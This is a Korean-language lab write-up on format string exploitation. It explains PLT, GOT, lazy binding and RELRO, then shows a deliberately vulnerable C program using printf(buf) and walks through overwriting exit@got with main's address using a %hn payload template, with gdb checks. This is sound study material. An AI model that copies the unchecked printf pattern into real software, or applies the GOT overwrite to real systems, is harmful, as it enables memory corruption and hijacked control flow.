# FSB GOT overwrite

## 1. 개요

이 실습에서는 **Format String Vulnerability(FSB)** 를 이용해
**Global Offset Table(GOT)** 를 overwrite하고,
프로그램의 **함수 호출 흐름을 공격자가 원하는 함수로 변경**하는 것을 목표로 한다.

기존의 ret overwrite 공격이
*함수 리턴 시점*을 노리는 것이라면,
GOT overwrite는
*함수 호출 시점*을 가로채는 공격이다.

이를 이해하기 위해서는 **PLT와 GOT의 역할과 구조**를 먼저 정리할 필요가 있다.

---

## 2. PLT와 GOT

리눅스 ELF 바이너리에서 `printf`, `exit`, `system` 과 같은 함수들은
대부분 실행 파일 내부에 존재하지 않고,
**libc.so** 와 같은 **공유 라이브러리(shared library)** 에 존재한다.

이 때문에 실행 파일은 외부 함수의 실제 주소를 직접 알 수 없으며,
이를 해결하기 위해 **PLT와 GOT** 라는 구조를 사용한다.

### PLT (Procedure Linkage Table)

* 외부 함수를 호출할 때 사용하는 **중계용 코드 영역**
* 실행 파일 내부의 `.plt` 섹션에 존재
* 실제 함수 주소로 점프하는 역할을 수행

PLT는 실행 가능한 코드이며,
모든 외부 함수 호출은 **항상 PLT를 통해 이루어진다**.

### GOT (Global Offset Table)

* 외부 함수의 **실제 주소를 저장하는 테이블**
* 실행 파일 내부의 `.got`, `.got.plt` 섹션에 존재
* 데이터 영역이며, 함수 주소 값만 저장한다

PLT는 GOT에 저장된 주소를 참조해
해당 주소로 점프함으로써 실제 함수를 호출한다.

---

## 3. GOT의 필요성

GOT가 필요한 이유는 다음과 같다.

### 1) Shared Library 사용

외부 함수들은 libc와 같은 공유 라이브러리에 존재하며,
실행 파일에 포함되지 않는다.

### 2) ASLR(Address Space Layout Randomization)

ASLR이 활성화된 환경에서는
libc가 매 실행마다 **다른 주소에 매핑**된다.

즉, 컴파일 시점에는
외부 함수의 실제 주소를 알 수 없다.

### 3) Lazy Binding

프로그램 시작 시 모든 외부 함수 주소를 해결하지 않고,
**처음 호출될 때만 주소를 resolve** 하는 방식이다.

이때:

* PLT는 항상 동일한 코드
* GOT의 내용만 실제 함수 주소로 갱신된다

이 구조 덕분에:

* 실행 속도를 최적화할 수 있고
* 동시에 GOT overwrite 공격 가능성도 생긴다.

> **노트**
>
> resolve란, 외부 함수의 실제 메모리 주소를 libc에서 찾아 GOT에 기록하는 과정을 의미한다.

---

## 4. 실제 실행 흐름

코드에 다음과 같은 명령어가 있다고 해보자:

``` c
exit(0);
```

컴파일할 때 컴파일러는 `exit`이라는 함수가 있으며 libc 안에 있다는 것까지만 알 뿐,
정확히 어디에 있는지는 알지 못한다.

그래서 실행 파일에는

* `exit`의 실제 주소는 없으며
* 대신 **PLT + GOT 구조** 만 만들어둔다.

### 1) 실행 직후 GOT 상태

프로그램이 막 실행됐을 때:
```
exit@got → resolver (동적 링커 코드)
```

* 아직 exit 주소는 모르고
* 나중에 필요할 때 알아봄 (lazy binding)

아직 resolve가 안 된 상태.

> **노트 ── resolver**
>
> 동적 링커 (ld-linux.so, ld.so) 안에 있는 코드
> 보통 실행 중인 프로세스에는 다음과 같이 올라간다.
> ```
> [stack]
> [libc]
> [ld-linux.so]  ← resolver 코드
> [heap]
> [.got.plt]
> [.plt]
> [text]
> ```


### 2) exit()이 처음 호출될 때

``` perl
exit()
 → exit@plt
 → jmp [exit@got]
 → (resolver로 점프)
 → libc에서 exit 실제 주소 찾음
 → exit@got = libc exit 주소로 덮어씀
 → libc exit 실행
```

### 3) resolve 이후 상태

```
exit@got → 0xf7e04bd0   (libc의 exit)
```
exit의 실제 주소를 알게 된 이후. 

따라서:

```
exit@plt
 → jmp [exit@got]
 → 바로 libc exit
```

다시 resolver를 거치지 않고, GOT에 적힌 주소로 점프한다.

> **노트 ── PLT의 동작**
>
> PLT는 "resolve가 됐나" 를 판단하지 않으며,
> 그저 GOT에 적힌 주소로 무조건 점프한다.
> * GOT에 resolver 주소가 적혀 있다면 resolver로 점프하고
> * 실제 주소가 적혀있다면 그 주소로 점프될 뿐이다.


---

## 5. GOT의 위치

### ELF 파일 관점

실행 파일 내부에서 PLT와 GOT는 다음과 같은 섹션에 존재한다.

```
.text
 └─ .plt        ← PLT (코드 영역)

.data
 └─ .got
 └─ .got.plt    ← GOT (데이터 영역)
```

* **PLT** : `.plt` 섹션 (실행 코드)
* **GOT** : `.got`, `.got.plt` 섹션 (데이터)

실제 공격에서 overwrite 대상으로 사용하는 것은
대부분 **`.got.plt` 영역**이다.

---

### 프로세스 메모리 관점

프로그램이 실행되면,
PLT와 GOT는 다음과 같은 위치에 매핑된다 (32bit, PIE OFF 기준).

```
높은 주소
------------------------
stack
------------------------
libc
------------------------
heap
------------------------
.bss
.data
.got.plt   ← GOT
.got
------------------------
.plt       ← PLT
.text
------------------------
낮은 주소
```

* `.plt` : RX (읽기 + 실행)
* `.got.plt` : RW (Partial RELRO 기준)

이로 인해:

* PLT는 실행만 가능
* GOT는 쓰기 가능 → **GOT overwrite 공격 가능**

> **노트 ── GOT가 쓰기 가능인 이유**
>
> resolver가 lazy binding을 위해 실행 중 GOT를 수정해야 하기 때문

---

## 6. RELRO와 GOT 보호

RELRO(Relocation Read-Only)는
GOT 영역을 보호하기 위한 링커 보안 옵션이다.

RELRO는 GOT를 언제 읽기 전용으로 만들 것인지에 따라
Partial RELRO와 Full RELRO로 나뉜다.

### Partial RELRO

- lazy binding 사용
- 프로그램 실행 중 resolver가 GOT를 수정해야 함
- `.got.plt` 영역이 쓰기 가능(RW)

이 경우 Format String Vulnerability를 이용한
GOT overwrite 공격이 가능하다.

### Full RELRO

- lazy binding 사용하지 않음
- 프로그램 시작 시 모든 외부 함수 주소를 resolve
- 이후 GOT를 읽기 전용(RO)으로 변경

이 경우 실행 중 GOT를 수정할 수 없으므로,
GOT overwrite 공격은 불가능하다.

본 실습에서는 GOT overwrite를 위해
Partial RELRO 환경을 사용한다.

---

## 7. 실습 환경


* Architecture: x86 (32-bit)
* ASLR: ON
* PIE: OFF
* NX: ON
* Stack Canary: OFF
* RELRO: Partial RELRO

PIE가 비활성화되어 있으므로,
실행 파일의 코드 영역과 GOT 주소는 실행마다 고정된다.
따라서 ASLR이 활성화되어 있어도
본 실습에는 영향을 주지 않는다.

---

## 8. 취약 코드

```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char buf[100];

    setregid(getegid(), getegid());

    puts("input:");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);      // Format String Vulnerability

    puts("done");
    exit(0);          // GOT overwrite 대상
}
```

### 취약점 요약

* `printf(buf)`

  * 사용자 입력이 포맷 문자열로 해석됨
  * Format String Vulnerability 발생
* `exit(0)`

  * PLT → GOT를 통해 함수 호출
  * GOT overwrite 시 호출 흐름 변경 가능

---

## 9. 공격 아이디어

본 실습의 목표는
**Format String Vulnerability를 이용해 `exit@got`을 overwrite하고,
프로그램의 실행 흐름을 변경하는 것**이다.

### overwrite 대상 선택

* overwrite 대상 함수: `exit`
* overwrite 대상 주소: `exit@got`
* overwrite 값: `main` 함수 주소

즉,

```
exit@got  →  main
```

으로 덮어써,
`exit()` 호출 시 프로그램이 종료되지 않고
다시 `main()`으로 점프하도록 만든다.

---

## 10. 주소 정보 수집

### 10.1 `main` 함수 주소

```bash
objdump -d vuln | grep '<main>'
```

출력 예시:

```
 80490cd:	e9 e4 00 00 00       	jmp    80491b6 <main>
080491b6 <main>:
```

→ `main = 0x080491b6`

### 10.2 `exit@got` 주소

```bash
readelf -r vuln | grep exit
```

출력 예시:

```
0804c014  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
```

→ `exit@got = 0x0804c014`

---

## 11. Format String offset 계산

다음 입력을 이용해,
`printf` 기준으로 입력 문자열이 몇 번째 인자로 해석되는지 확인한다.

```
AAAA.%x.%x.%x.%x.%x.%x.%x.%x
```

출력 예시:

```
AAAA.64.f3c8c5c0.80491e0.ff9fe294.f3cb97de.804821c.41414141.2e78252e
```

`41414141`이 7번째 위치에서 관측되므로,

```
offset = 7
```

---

## 12. GOT overwrite payload 구성

### 12.1 overwrite 값 분해

`main` 주소는 다음과 같다.

```
main = 0x080491b6
```

이를 2바이트 단위로 나누면:

```
low  = 0x91b6
high = 0x0804
```

### 12.2 payload 구조

```
[ exit@got ][ exit@got+2 ]
%pad1c %7$hn
%pad2c %8$hn
```

* `%hn`을 이용해 2바이트씩 overwrite
* 하위 바이트 → 상위 바이트 순서로 기록

---

## 13. 결과

### 실행 결과

payload를 입력한 후 실행 결과는 다음과 같다.

![result](https://github.com/sage-502/pwnable-lab/blob/main/images/fsb-got-overwrite/01.png)

`exit()` 호출 시 프로그램이 종료되지 않고
`main()`으로 다시 점프하며,
이로 인해 `main` 스택 프레임이 반복적으로 쌓여
결국 segmentation fault가 발생한다.

이는 `exit@got`이 성공적으로 overwrite되어
함수 호출 흐름이 변경되었음을 의미한다.

### gdb를 이용한 검증

gdb에서 overwrite 전 `exit@got` 확인:

```gdb
(gdb) x/wx 0x0804c014
0x804c014 <exit@got.plt>:	0x08049086
```

gdb에서 overwrite 후 `exit@got` 확인:

```gdb
(gdb) x/wx 0x0804c014
0x0804c014 <exit@got.plt>: 0x080491b6
```

또한 `exit@plt`에서 단일 스텝 실행 시:

```
exit@plt → main
```

으로 점프하는 것을 확인할 수 있다.

이는 PLT가 GOT에 저장된 주소를 그대로 신뢰하여
제어 흐름이 변경되었음을 보여준다.

실제 gdb 스샷: 
![gdb](https://github.com/sage-502/pwnable-lab/blob/main/images/fsb-got-overwrite/03.png)

---

## 15. 정리

* Format String Vulnerability를 이용해 GOT overwrite가 가능함을 확인했다.
* Partial RELRO 환경에서는 `.got.plt` 영역이 쓰기 가능하다.
* PLT는 판단 없이 GOT에 저장된 주소로 점프한다.
* GOT overwrite는 함수 호출 흐름을 직접 변경할 수 있다.
